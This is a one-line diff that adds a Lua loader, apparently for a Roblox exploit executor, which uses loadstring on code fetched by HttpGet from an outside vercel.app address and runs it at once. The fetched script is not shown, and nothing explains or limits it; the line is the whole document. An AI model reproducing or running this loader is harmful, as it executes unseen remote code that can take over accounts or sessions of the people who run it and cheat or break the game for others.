@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://institutionio.vercel.app/backend?file=ca7ca20b-484c-4c3e-bfc6-b788861e3655=ssscript.lua'))()
